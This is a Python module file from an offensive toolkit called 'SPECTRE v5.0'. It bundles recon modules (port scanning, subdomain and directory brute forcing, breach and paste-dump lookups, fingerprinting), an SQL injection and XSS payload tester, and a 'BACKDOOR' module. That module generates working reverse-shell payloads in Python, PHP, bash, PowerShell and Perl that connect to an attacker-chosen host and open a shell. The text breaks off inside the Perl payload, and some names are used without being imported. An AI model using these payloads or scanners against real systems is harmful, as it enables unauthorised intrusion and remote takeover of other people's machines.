#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  SPECTRE v5.0 - MODULES
#  26 modul: recon + attack + exploit
#  👻 AUTHOR: イズミー (IZUMI)
# ============================================================

import os
import re
import ssl
import json
import time
import socket
import asyncio
import subprocess
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Optional, Dict, List

from core import (cfg, log, C, Utils, Crypto, SessionFactory,
                  Writer, store)

try:
    import requests
except ImportError:
    requests = None

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import whois as whois_lib
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False

try:
    import phonenumbers
    from phonenumbers import carrier as phone_carrier, geocoder as phone_geo
    HAS_PHONE = True
except ImportError:
    HAS_PHONE = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import folium
    HAS_FOLIUM = True
except ImportError:
    HAS_FOLIUM = False


# ============================================================
# BASE
# ============================================================
class BaseModule:
    name = "base"
    description = ""
    severity = "info"

    def __init__(self, target: str, session=None):
        self.target = str(target)
        self.session = session or SessionFactory.create()
        self.result: Dict[str, Any] = {}
        self.findings: List[Dict[str, Any]] = []

    def url(self) -> str:
        return Utils.normalize_url(self.target)

    def add_finding(self, title, detail, severity="info"):
        f = {"title": title, "detail": detail, "severity": severity,
             "target": self.target, "ts": Utils.now(), "module": self.name}
        self.findings.append(f)
        try:
            store().save_finding(self.target, self.name, detail, severity)
        except Exception:
            pass
        return f

    def save(self):
        try:
            store().save(self.target, self.name, self.result,
                         severity=self.severity)
        except Exception as e:
            log.error(f"save: {e}")

    def run(self) -> Dict[str, Any]:
        raise NotImplementedError


# ============================================================
# 1. GEOIP
# ============================================================
class GeoIPModule(BaseModule):
    name = "geoip"
    description = "Geolocation"

    def run(self):
        print(Fore.CYAN + "── 📍 GEOIP ──")
        try:
            r = self.session.get(f"http://ip-api.com/json/{self.target}",
                                  timeout=10)
            data = r.json()
            if data.get("status") == "success":
                self.result = data
                print(C.s(f"IP: {data.get('query')}"))
                print(C.s(f"Location: {data.get('city')}, {data.get('country')}"))
                print(C.s(f"ISP: {data.get('isp')}"))
                print(C.s(f"Coords: {data.get('lat')}, {data.get('lon')}"))
                if data.get("proxy") or data.get("hosting"):
                    self.add_finding("Proxy/Hosting detected",
                                     f"IP {data.get('query')}", "low")
                if HAS_FOLIUM:
                    try:
                        m = folium.Map(location=[data["lat"], data["lon"]],
                                       zoom_start=10)
                        folium.Marker([data["lat"], data["lon"]],
                                      popup=self.target).add_to(m)
                        fn = f"geo_{Utils.safe_filename(self.target)}.html"
                        m.save(fn)
                        print(C.s(f"Map: {fn}"))
                    except Exception:
                        pass
            else:
                print(C.e(f"Failed: {data.get('message')}"))
                self.result = {"error": data.get("message")}
        except Exception as e:
            print(C.e(f"Error: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 2. BREACH
# ============================================================
class BreachModule(BaseModule):
    name = "breach"

    def run(self):
        print(Fore.CYAN + "── 🔍 BREACH ──")
        if not Utils.is_email(self.target):
            print(C.w("Not email"))
            self.result = {"skipped": "not email"}
            self.save()
            print()
            return self.result
        try:
            r = self.session.get(
                f"https://haveibeenpwned.com/api/v3/breachedaccount/"
                f"{self.target}?truncateResponse=false",
                timeout=15, headers={"User-Agent": "Spectre-OSINT"},
            )
            if r.status_code == 200:
                breaches = r.json()
                self.result = {"breaches": breaches}
                print(C.h(f"Found {len(breaches)} breaches!"))
                for b in breaches[:10]:
                    print(f"  📌 {b['Name']} ({b['BreachDate']})")
                if breaches:
                    self.add_finding(
                        f"Email in {len(breaches)} breaches",
                        ", ".join(b['Name'] for b in breaches[:5]),
                        "medium")
            elif r.status_code == 404:
                print(C.s("Clean"))
                self.result = {"breaches": []}
            else:
                print(C.w(f"HTTP {r.status_code}"))
                self.result = {"error": r.status_code}
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 3. DARKWEB
# ============================================================
class DarkWebModule(BaseModule):
    name = "darkweb"

    def run(self):
        print(Fore.CYAN + "── 🌑 DARKWEB ──")
        out = {"psbdmp": [], "forums": []}
        try:
            r = self.session.get(
                f"https://psbdmp.ws/api/search/{self.target}", timeout=15)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    for item in data[:20]:
                        entry = {"id": item.get("id"),
                                 "url": f"https://pastebin.com/{item.get('id')}"}
                        out["psbdmp"].append(entry)
                        print(C.h(f"Paste: {entry['url']}"))
                    if data:
                        self.add_finding(f"Found {len(data)} pastes",
                                         f"{len(data)} paste dumps", "high")
                if not out["psbdmp"]:
                    print(C.s("No paste dump"))
        except Exception as e:
            print(C.w(f"psbdmp: {e}"))
        self.result = out
        self.save()
        print()
        return self.result


# ============================================================
# 4. PHONE
# ============================================================
class PhoneModule(BaseModule):
    name = "phone"

    def run(self):
        print(Fore.CYAN + "── 📱 PHONE ──")
        if not HAS_PHONE:
            print(C.e("phonenumbers missing"))
            self.result = {"error": "missing dep"}
            self.save()
            print()
            return self.result
        try:
            parsed = phonenumbers.parse(str(self.target), "ID")
            if phonenumbers.is_valid_number(parsed):
                self.result = {
                    "valid": True,
                    "formatted": phonenumbers.format_number(
                        parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                    "carrier": phone_carrier.name_for_number(parsed, "en"),
                    "location": phone_geo.description_for_number(parsed, "en"),
                    "country_code": parsed.country_code,
                }
                print(C.s(f"Number: {self.result['formatted']}"))
                print(C.s(f"Carrier: {self.result['carrier']}"))
                print(C.s(f"Location: {self.result['location']}"))
            else:
                print(C.e("Invalid"))
                self.result = {"valid": False}
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 5. PORTSCAN
# ============================================================
class PortModule(BaseModule):
    name = "portscan"
    severity = "medium"

    TOP_PORTS = [21,22,23,25,53,80,110,111,135,139,143,161,179,389,443,
                 445,465,514,515,548,554,587,631,636,873,990,993,995,1080,
                 1433,1521,1723,1883,2049,2082,2222,2375,3000,3306,3389,
                 4443,4444,5000,5432,5555,5672,5900,5984,6000,6379,6443,
                 6666,7001,7002,7070,7443,8000,8008,8080,8081,8082,8086,
                 8088,8090,8123,8161,8443,8500,8888,9000,9001,9042,9090,
                 9160,9200,9300,9443,10000,11211,15672,27017,27018,50000]

    def _scan(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            rc = s.connect_ex((self.target, port))
            s.close()
            if rc != 0:
                return None
            banner = None
            try:
                bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bs.settimeout(1.5)
                bs.connect((self.target, port))
                if port in (80, 8080, 8000, 443, 8443):
                    bs.send(b"HEAD / HTTP/1.0\r\nUser-Agent: Spectre\r\n\r\n")
                else:
                    bs.send(b"\r\n")
                banner = bs.recv(512).decode(errors="ignore").strip()
                bs.close()
            except Exception:
                pass
            return {"port": port, "banner": banner[:200] if banner else None}
        except Exception:
            return None

    def run(self):
        print(Fore.CYAN + "── 🔍 PORTSCAN ──")
        print(C.i(f"Scanning {len(self.TOP_PORTS)} ports..."))
        open_ports = []
        t0 = time.time()
        with ThreadPoolExecutor(max_workers=200) as ex:
            futures = {ex.submit(self._scan, p): p for p in self.TOP_PORTS}
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    open_ports.append(r)
                    b = r.get("banner") or ""
                    print(C.s(f"Port {r['port']} OPEN" + (f" → {b[:60]}" if b else "")))
        self.result = {"open_ports": sorted(open_ports, key=lambda x: x["port"]),
                       "count": len(open_ports),
                       "duration": round(time.time() - t0, 2)}
        sensitive = {21:"FTP",23:"Telnet",445:"SMB",1433:"MSSQL",3306:"MySQL",
                     3389:"RDP",5432:"Postgres",5900:"VNC",6379:"Redis",
                     27017:"MongoDB"}
        for e in open_ports:
            p = e["port"]
            if p in sensitive:
                self.add_finding(f"{sensitive[p]} exposed:{p}",
                                 f"Banner: {e.get('banner', 'n/a')}",
                                 "high" if p in (445,3389,6379,27017) else "medium")
        print(C.i(f"{len(open_ports)} open in {self.result['duration']}s"))
        self.save()
        print()
        return self.result


# ============================================================
# 6. WHOIS
# ============================================================
class WhoisModule(BaseModule):
    name = "whois"

    def run(self):
        print(Fore.CYAN + "── 🌐 WHOIS ──")
        if not HAS_WHOIS:
            print(C.e("python-whois missing"))
            self.result = {"error": "missing"}
            self.save()
            print()
            return self.result
        domain = self.target
        if Utils.is_url(domain):
            from urllib.parse import urlparse
            domain = urlparse(domain).netloc.split(":")[0]
        try:
            w = whois_lib.whois(domain)
            self.result = {
                "domain": domain,
                "registrar": str(w.registrar) if w.registrar else None,
                "creation_date": str(w.creation_date) if w.creation_date else None,
                "expiration_date": str(w.expiration_date) if w.expiration_date else None,
                "name_servers": list(w.name_servers) if w.name_servers else [],
                "emails": list(w.emails) if w.emails else [],
                "org": str(w.org) if w.org else None,
                "country": str(w.country) if w.country else None,
            }
            print(C.s(f"Registrar: {self.result['registrar']}"))
            print(C.s(f"Created: {self.result['creation_date']}"))
            print(C.s(f"Expires: {self.result['expiration_date']}"))
            if self.result["emails"]:
                print(C.s(f"Emails: {self.result['emails'][:3]}"))
                self.add_finding("Registrant email disclosed",
                                 f"{self.result['emails']}", "low")
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 7. DNS
# ============================================================
class DNSModule(BaseModule):
    name = "dns"
    RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "CAA"]

    def run(self):
        print(Fore.CYAN + "── 🌐 DNS ──")
        if not HAS_DNS:
            print(C.e("dnspython missing"))
            self.result = {"error": "missing"}
            self.save()
            print()
            return self.result
        domain = self.target
        if Utils.is_url(domain):
            from urllib.parse import urlparse
            domain = urlparse(domain).netloc.split(":")[0]
        records = {}
        for rt in self.RECORD_TYPES:
            try:
                ans = dns.resolver.resolve(domain, rt, lifetime=5)
                records[rt] = [str(r) for r in ans]
                print(C.s(f"{rt}: {', '.join(records[rt][:3])}"))
            except Exception:
                records[rt] = []
        spf = dmarc = None
        for txt in records.get("TXT", []):
            if "v=spf1" in txt: spf = txt
            if "v=DMARC1" in txt: dmarc = txt
        self.result = {"domain": domain, "records": records,
                       "has_spf": bool(spf), "has_dmarc": bool(dmarc), "spf": spf}
        if not spf:
            self.add_finding("Missing SPF", "No SPF TXT", "medium")
        if not dmarc:
            self.add_finding("Missing DMARC", "No DMARC policy", "medium")
        self.save()
        print()
        return self.result


# ============================================================
# 8. SUBDOMAIN
# ============================================================
class SubdomainModule(BaseModule):
    name = "subdomain"
    WORDLIST = ["www","mail","smtp","pop","imap","webmail","mx","ns1","ns2",
                "admin","portal","dashboard","cp","cpanel","blog","news","forum",
                "wiki","docs","help","support","dev","test","staging","stage",
                "uat","qa","demo","api","api-v1","api-v2","rest","graphql","ws",
                "app","mobile","m","shop","store","cdn","static","assets","media",
                "img","images","vpn","remote","rdp","ssh","git","gitlab","github",
                "jenkins","ci","cd","build","deploy","db","mysql","postgres","mongo",
                "redis","elastic","s3","backup","files","share","ftp","sftp",
                "analytics","tracking","metrics","monitor","status","auth","sso",
                "login","oauth","id"]

    def _check(self, sub):
        d = f"{sub}.{self.target}"
        try:
            ip = socket.gethostbyname(d)
            return {"sub": d, "ip": ip}
        except Exception:
            return None

    def run(self):
        print(Fore.CYAN + "── 🔍 SUBDOMAIN ──")
        domain = self.target
        if Utils.is_url(domain):
            from urllib.parse import urlparse
            domain = urlparse(domain).netloc.split(":")[0]
        found = []
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(self._check, w) for w in self.WORDLIST]
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    found.append(r)
                    print(C.s(f"{r['sub']} → {r['ip']}"))
                    for hint in ["github.io","herokuapp.com","s3.amazonaws.com",
                                 "azurewebsites.net","cloudfront.net"]:
                        if hint in r["sub"]:
                            self.add_finding(f"Takeover? {r['sub']}",
                                             f"CNAME→{hint}", "high")
        self.result = {"domain": domain, "found": found, "count": len(found)}
        print(C.i(f"{len(found)} subdomains"))
        self.save()
        print()
        return self.result


# ============================================================
# 9. EMAIL
# ============================================================
class EmailModule(BaseModule):
    name = "email_harvest"
    PATTERNS = ["admin","info","support","contact","webmaster","noreply",
                "help","sales","hr","it","security","billing","marketing","abuse"]

    def run(self):
        print(Fore.CYAN + "── 📧 EMAIL ──")
        domain = self.target
        if Utils.is_url(domain):
            from urllib.parse import urlparse
            domain = urlparse(domain).netloc.split(":")[0]
        emails = [f"{p}@{domain}" for p in self.PATTERNS]
        hunter_key = cfg.get("recon.hunter_key", "")
        if hunter_key:
            try:
                r = self.session.get("https://api.hunter.io/v2/domain-search",
                                      params={"domain": domain, "api_key": hunter_key},
                                      timeout=15)
                if r.status_code == 200:
                    for e in r.json().get("data", {}).get("emails", []):
                        addr = e.get("value")
                        if addr and addr not in emails:
                            emails.append(addr)
                            print(C.s(f"{addr} (hunter)"))
            except Exception as e:
                print(C.w(f"hunter: {e}"))
        for e in emails[:15]:
            if "@" in e and e not in [f"{p}@{domain}" for p in self.PATTERNS]:
                continue
            print(C.s(e))
        self.result = {"emails": emails, "count": len(emails)}
        self.save()
        print()
        return self.result


# ============================================================
# 10. SSL
# ============================================================
class SSLModule(BaseModule):
    name = "ssl"

    def run(self):
        print(Fore.CYAN + "── 🔐 SSL ──")
        host = self.target
        if Utils.is_url(host):
            from urllib.parse import urlparse
            host = urlparse(host).netloc.split(":")[0]
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
            subj = dict(x[0] for x in cert.get("subject", []))
            issuer = dict(x[0] for x in cert.get("issuer", []))
            self.result = {
                "subject": subj, "issuer": issuer,
                "not_before": cert.get("notBefore"),
                "not_after": cert.get("notAfter"),
                "san": [x[1] for x in cert.get("subjectAltName", [])],
                "version": version,
                "cipher": cipher[0] if cipher else None,
            }
            print(C.s(f"Subject: {subj.get('commonName', '?')}"))
            print(C.s(f"Issuer: {issuer.get('organizationName', '?')}"))
            print(C.s(f"TLS: {version} | Cipher: {self.result['cipher']}"))
            if version in ("TLSv1", "TLSv1.1"):
                self.add_finding("Outdated TLS", f"{version} deprecated", "high")
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 11. SOCIAL
# ============================================================
class SocialModule(BaseModule):
    name = "social"
    PLATFORMS = {
        "Instagram": "https://instagram.com/{u}",
        "Twitter": "https://twitter.com/{u}",
        "Facebook": "https://facebook.com/{u}",
        "TikTok": "https://tiktok.com/@{u}",
        "Telegram": "https://t.me/{u}",
        "GitHub": "https://github.com/{u}",
        "Reddit": "https://reddit.com/user/{u}",
        "YouTube": "https://youtube.com/@{u}",
        "LinkedIn": "https://linkedin.com/in/{u}",
        "Pinterest": "https://pinterest.com/{u}",
        "Twitch": "https://twitch.tv/{u}",
        "Medium": "https://medium.com/@{u}",
    }

    def _check(self, name, url):
        try:
            r = self.session.get(url, timeout=8, allow_redirects=True)
            title = ""
            if HAS_BS4:
                soup = BeautifulSoup(r.text, "html.parser")
                if soup.title:
                    title = soup.title.string or ""
            text = r.text.lower()[:2000]
            nf = ["not found","page not found","user not found",
                  "doesn't exist","does not exist","404",
                  "sorry, this page","account suspended"]
            exists = (r.status_code == 200 and
                      not any(s in title.lower() or s in text for s in nf))
            return {"platform": name, "url": url, "exists": exists,
                    "status": r.status_code, "title": Utils.truncate(title, 80)}
        except Exception as e:
            return {"platform": name, "url": url, "exists": False, "error": str(e)}

    def run(self):
        print(Fore.CYAN + "── 📸 SOCIAL ──")
        username = self.target.strip("@")
        results = []
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(self._check, n, u.format(u=username)): n
                       for n, u in self.PLATFORMS.items()}
            for fut in as_completed(futures):
                r = fut.result()
                results.append(r)
                if r.get("exists"):
                    print(C.s(f"{r['platform']}: FOUND → {r['url']}"))
                else:
                    print(C.w(f"{r['platform']}: not found"))
        found = [r for r in results if r.get("exists")]
        self.result = {"username": username, "found": found, "all": results}
        print(C.i(f"{len(found)}/{len(results)} platforms"))
        self.save()
        print()
        return self.result


# ============================================================
# 12. TECH
# ============================================================
class TechModule(BaseModule):
    name = "tech"
    severity = "medium"

    def _fp_server(self, headers):
        s = headers.get("Server", "Unknown")
        sl = s.lower()
        for kind in ["nginx","apache","cloudflare","caddy","iis","litespeed",
                     "openresty","gunicorn","werkzeug","tomcat","jetty"]:
            if kind in sl:
                m = re.search(rf"{kind}/?([\d.]+)?", sl)
                return {"type": kind, "version": m.group(1) if m and m.group(1) else None,
                        "raw": s}
        return {"type": "unknown", "raw": s}

    def _match(self, headers, sigs):
        blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
        return any(s.lower() in blob for s in sigs)

    def _cdn(self, h):
        sigs = {"cloudflare": ["cf-ray","cf-cache-status"],
                "akamai": ["x-akamai","akamai"],
                "fastly": ["x-fastly"],
                "cloudfront": ["x-amz-cf-id"],
                "bunnycdn": ["bunnycdn"],
                "azure": ["azure-cdn"]}
        return [n for n, s in sigs.items() if self._match(h, s)]

    def _waf(self, h, body=""):
        sigs = {"cloudflare": ["cf-ray","cf-chl"],
                "imperva": ["x-iinfo"],
                "f5": ["x-ws","bigip"],
                "sucuri": ["x-sucuri"],
                "aws": ["awselb"],
                "modsecurity": ["mod_security","modsecurity"]}
        found = [n for n, s in sigs.items() if self._match(h, s)]
        if "cloudflare" in body.lower():
            found.append("cloudflare")
        return list(set(found))

    def _cms(self, html):
        cms = []
        h = html.lower()
        mapping = {"wp-content": "WordPress", "wp-includes": "WordPress",
                   "wp-json": "WordPress", "drupal": "Drupal",
                   "joomla": "Joomla", "magento": "Magento",
                   "shopify": "Shopify", "ghost": "Ghost",
                   "wix.com": "Wix", "squarespace": "Squarespace"}
        for marker, name in mapping.items():
            if marker in h:
                cms.append(name)
        return list(set(cms))

    def _fe(self, html):
        h = html.lower()
        fe = set()
        for k, n in [("react","React"),("vue.js","Vue.js"),("__vue__","Vue.js"),
                     ("angular","Angular"),("ng-app","Angular"),
                     ("next.js","Next.js"),("_next/","Next.js"),
                     ("nuxt","Nuxt"),("svelte","Svelte"),
                     ("bootstrap","Bootstrap"),("tailwind","Tailwind"),
                     ("jquery","jQuery")]:
            if k in h:
                fe.add(n)
        return list(fe)

    def _sec_headers(self, headers):
        checks = {"Strict-Transport-Security": False,
                  "Content-Security-Policy": False,
                  "X-Frame-Options": False,
                  "X-Content-Type-Options": False,
                  "Referrer-Policy": False,
                  "Permissions-Policy": False,
                  "X-XSS-Protection": False}
        for h in checks:
            if h in headers:
                checks[h] = True
        return checks

    def run(self):
        print(Fore.CYAN + "── 🛠️ TECH ──")
        url = self.url()
        try:
            r = self.session.get(url, timeout=10, allow_redirects=True)
            html = r.text
            headers = dict(r.headers)
            server = self._fp_server(headers)
            cdn = self._cdn(headers)
            waf = self._waf(headers, html)
            cms = self._cms(html)
            frontend = self._fe(html)
            sec = self._sec_headers(headers)
            powered = headers.get("X-Powered-By", "N/A")
            self.result = {"url": url, "status": r.status_code,
                           "server": server, "powered_by": powered,
                           "cdn": cdn, "waf": waf, "cms": cms,
                           "frontend": frontend, "security_headers": sec,
                           "title": None}
            if HAS_BS4:
                soup = BeautifulSoup(html, "html.parser")
                if soup.title:
                    self.result["title"] = soup.title.string
            print(C.s(f"Server: {server['raw']}"))
            print(C.s(f"Powered By: {powered}"))
            print(C.s(f"CDN: {', '.join(cdn) or 'none'}"))
            print(C.s(f"WAF: {', '.join(waf) or 'none'}"))
            print(C.s(f"CMS: {', '.join(cms) or 'none'}"))
            print(C.s(f"Frontend: {', '.join(frontend) or 'unknown'}"))
            print(C.s(f"Title: {self.result['title']}"))
            print(Fore.MAGENTA + "\n  Security Headers:")
            for h, ok in sec.items():
                print(f"    {'✅' if ok else '❌'} {h}")
            missing = [h for h, ok in sec.items() if not ok]
            if missing:
                self.add_finding(f"Missing {len(missing)} sec headers",
                                 ", ".join(missing), "low")
            if not waf:
                self.add_finding("No WAF", "No WAF signature", "low")
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 13. DIR BRUTE
# ============================================================
class DirModule(BaseModule):
    name = "dir_brute"
    WORDLIST = ["admin","administrator","login","wp-admin","wp-login.php",
                "cpanel","phpmyadmin","pma","mysql","myadmin",
                ".env",".git/config",".git/HEAD","config.php","config.yml",
                "config.json","web.config","wp-config.php","settings.py",
                "backup","backup.zip","backup.tar.gz","backup.sql","db.sql",
                "dump.sql","database.sql","site.zip",
                "api","api/v1","api/v2","graphql","swagger.json",
                "swagger-ui.html","api-docs","openapi.json",
                "robots.txt","sitemap.xml",".htaccess","readme.txt",
                "README.md","CHANGELOG.md",".well-known/security.txt",
                "assets","static","media","uploads","files","images",
                "css","js","img","test","dev","staging","stage","demo","beta",
                "logs","log","error.log","access.log","debug.log",
                "jenkins","gitlab","ci","build","status","health","healthz",
                "metrics","actuator","actuator/health","actuator/env",
                "server-status"]

    def _check(self, base, path):
        try:
            r = self.session.get(f"{base}/{path}", timeout=5,
                                  allow_redirects=False)
            if r.status_code in (200, 201, 204, 301, 302, 401, 403, 500):
                return {"path": path, "url": f"{base}/{path}",
                        "status": r.status_code,
                        "length": len(r.content),
                        "content_type": r.headers.get("Content-Type", "")}
        except Exception:
            pass
        return None

    def run(self):
        print(Fore.CYAN + "── 📂 DIR BRUTE ──")
        base = self.url().rstrip("/")
        found = []
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(self._check, base, w) for w in self.WORDLIST]
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    found.append(r)
                    color = Fore.GREEN if r["status"] == 200 else Fore.YELLOW
                    print(f"  {color}[{r['status']}]{Style.RESET_ALL} "
                          f"{r['path']} ({r['length']}b)")
                    sensitive = [".env", ".git", "backup", ".sql",
                                 "wp-config", "config.php", "actuator"]
                    if any(s in r["path"] for s in sensitive):
                        self.add_finding(f"Sensitive: /{r['path']}",
                                         f"HTTP {r['status']}", 
                                         "high" if r["status"] == 200 else "medium")
        self.result = {"base": base, "found": found, "count": len(found)}
        print(C.i(f"{len(found)} paths"))
        self.save()
        print()
        return self.result


# ============================================================
# 14. ASYNC RECON
# ============================================================
class AsyncReconModule(BaseModule):
    name = "async_recon"

    async def _ports(self, ports):
        sem = asyncio.Semaphore(500)
        async def check(p):
            async with sem:
                try:
                    fut = asyncio.open_connection(self.target, p)
                    _, w = await asyncio.wait_for(fut, timeout=1.5)
                    w.close()
                    try: await w.wait_closed()
                    except Exception: pass
                    return p
                except Exception:
                    return None
        results = await asyncio.gather(*[check(p) for p in ports])
        return sorted([r for r in results if r])

    async def _subs(self, subs):
        sem = asyncio.Semaphore(500)
        async def check(s):
            async with sem:
                host = f"{s}.{self.target}"
                try:
                    info = await asyncio.get_event_loop().getaddrinfo(host, None)
                    return {"sub": host, "ip": info[0][4][0]}
                except Exception:
                    return None
        results = await asyncio.gather(*[check(s) for s in subs])
        return [r for r in results if r]

    def run(self):
        print(Fore.CYAN + "── ⚡ ASYNC RECON ──")
        return asyncio.run(self._run_async())

    async def _run_async(self):
        t0 = time.time()
        ports = sorted(set(PortModule.TOP_PORTS))
        t1 = time.time()
        open_ports = await self._ports(ports)
        port_dt = round(time.time() - t1, 2)
        print(C.s(f"Ports: {len(open_ports)} in {port_dt}s"))

        subs = SubdomainModule.WORDLIST[:60]
        t1 = time.time()
        found_subs = await self._subs(subs)
        sub_dt = round(time.time() - t1, 2)
        print(C.s(f"Subdomains: {len(found_subs)} in {sub_dt}s"))

        self.result = {"open_ports": open_ports, "subdomains": found_subs,
                       "timing": {"ports_s": port_dt, "subdomains_s": sub_dt,
                                  "total_s": round(time.time() - t0, 2)}}
        self.save()
        print(C.a(f"Total: {self.result['timing']['total_s']}s"))
        print()
        return self.result


# ============================================================
# 15. SHODAN
# ============================================================
class ShodanModule(BaseModule):
    name = "shodan"

    def run(self):
        print(Fore.CYAN + "── 🌐 SHODAN ──")
        api_key = cfg.get("recon.shodan_key", "")
        if not api_key:
            print(C.w("No API key"))
            self.result = {"error": "no api key"}
            self.save()
            print()
            return self.result
        try:
            r = self.session.get(
                f"https://api.shodan.io/shodan/host/{self.target}",
                params={"key": api_key}, timeout=20,
            )
            if r.status_code == 200:
                j = r.json()
                self.result = {
                    "ip": j.get("ip_str"), "org": j.get("org"),
                    "isp": j.get("isp"), "os": j.get("os"),
                    "country": j.get("country_name"), "city": j.get("city"),
                    "ports": j.get("ports", []),
                    "vulns": list(j.get("vulns", {}).keys()),
                }
                print(C.s(f"IP: {self.result['ip']}"))
                print(C.s(f"Org: {self.result['org']}"))
                print(C.s(f"Ports: {self.result['ports']}"))
                if self.result["vulns"]:
                    print(C.h(f"CVEs: {self.result['vulns']}"))
                    for cve in self.result["vulns"]:
                        self.add_finding(f"Shodan: {cve}",
                                         f"on {self.target}", "high")
            else:
                print(C.e(f"HTTP {r.status_code}"))
                self.result = {"error": r.status_code}
        except Exception as e:
            print(C.e(f"Failed: {e}"))
            self.result = {"error": str(e)}
        self.save()
        print()
        return self.result


# ============================================================
# 16. SQLI
# ============================================================
class SQLiModule(BaseModule):
    name = "sqli"
    severity = "high"

    SQLI = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "') OR ('1'='1",
            "1' AND SLEEP(5)--", "1' UNION SELECT NULL--",
            "admin'--", "' OR 'x'='x"]
    XSS = ["<script>alert(1)</script>",
           "\"><script>alert(1)</script>",
           "'><img src=x onerror=alert(1)>",
           "<svg/onload=alert(1)>",
           "javascript:alert(1)"]
    ERRORS = ["you have an error in your sql syntax","warning: mysql",
              "unclosed quotation mark","quoted string not properly terminated",
              "microsoft ole db","odbc sql server","postgresql query failed",
              "pg_query()","sqlite3.operationalerror","oracle error",
              "ora-01756","mysql_fetch","sqlstate"]

    def _extract_params(self, url):
        from urllib.parse import urlparse, parse_qs
        params = {}
        parsed = urlparse(url)
        if parsed.query:
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        if not params and HAS_BS4:
            try:
                r = self.session.get(url, timeout=8)
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    for inp in form.find_all(["input", "textarea"]):
                        name = inp.get("name")
                        if name and inp.get("type") not in ("submit", "button", "hidden"):
                            params[name] = "test"
                    if params:
                        break
            except Exception:
                pass
        return params

    def _test(self, url, param, payload):
        try:
            r = self.session.get(url, params={param: payload}, timeout=10)
            text = r.text.lower()
            for err in self.ERRORS:
                if err in text:
                    return {"type": "SQLi (error)", "param": param,
                            "payload": payload, "evidence": err, "url": r.url}
            if payload in r.text and "<script" in payload.lower():
                return {"type": "XSS (reflected)", "param": param,
                        "payload": payload, "url": r.url}
        except Exception:
            pass
        return None

    def run(self):
        print(Fore.CYAN + "── 💉 SQLi/XSS ──")
        url = self.url().split("?")[0]
        params = self._extract_params(url)
        if not params:
            print(C.w("No params"))
            self.result = {"skipped": "no params"}
            self.save()
            print()
            return self.result
        print(C.i(f"Params: {list(params.keys())}"))
        findings = []
        for param in params:
            for p in self.SQLI + self.XSS:
                r = self._test(url, param, p)
                if r:
                    findings.append(r)
                    sev = "critical" if "SQLi" in r["type"] else "high"
                    self.add_finding(f"{r['type']}: {param}",
                                     f"Payload: {p}", sev)
                    print(C.h(f"{r['type']} → {param}={p}"))
        self.result = {"url": url, "params": list(params.keys()),
                       "findings": findings, "count": len(findings)}
        if not findings:
            print(C.s("No vuln"))
        self.save()
        print()
        return self.result


# ============================================================
# 17. BACKDOOR
# ============================================================
class BackdoorModule(BaseModule):
    name = "backdoor"

    def run(self):
        print(Fore.CYAN + "── 🔥 BACKDOOR ──")
        if ":" in self.target:
            host, port = self.target.split(":", 1)
            port = int(port) if port.isdigit() else 4444
        else:
            host = self.target
            port = 4444
        print(C.h(f"Target: {host}:{port}"))
        payloads = {
            "python": f'''#!/usr/bin/env python3
import socket, subprocess, os, time
HOST="{host}"; PORT={port}
while True:
    try:
        s = socket.socket(); s.connect((HOST,PORT)); break
    except Exception: time.sleep(5)
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
''',
            "php": f'''<?php
$s = fsockopen("{host}", {port});
$p = proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s), $pipes);
?>
''',
            "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n",
            "powershell": f'''$c=New-Object System.Net.Sockets.TCPClient("{host}",{port});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1|Out-String);
    $sbt=([text.encoding]::ASCII).GetBytes($sb);
    $s.Write($sbt,0,$sbt.Length);$s.Flush()
}};$c.Close()
''',
            "perl": f'''#!/usr/bin/perl
use Socket;
$i="{host}"; $p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
